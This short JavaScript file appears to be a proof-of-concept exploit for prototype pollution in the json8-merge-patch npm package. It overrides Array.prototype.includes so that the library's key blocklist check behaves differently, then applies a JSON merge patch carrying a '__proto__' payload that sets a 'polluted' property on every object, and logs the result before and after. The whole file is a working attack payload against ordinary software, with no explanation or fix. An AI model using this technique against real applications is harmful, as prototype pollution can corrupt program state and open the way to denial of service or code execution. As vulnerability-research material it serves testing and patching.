Array.prototype.includes = function (key) {
    if (key == '__proto__' || key == 'constructor' || key == 'prototype' || key == 'polluted') {
        return false;
    } else {
        return true;
    }
};
console.log({}.polluted);
const json8mergepatch = require('json8-merge-patch');
json8mergepatch.apply({}, JSON.parse('{ "__proto__": { "polluted": "yes" }}'));
console.log({}.polluted);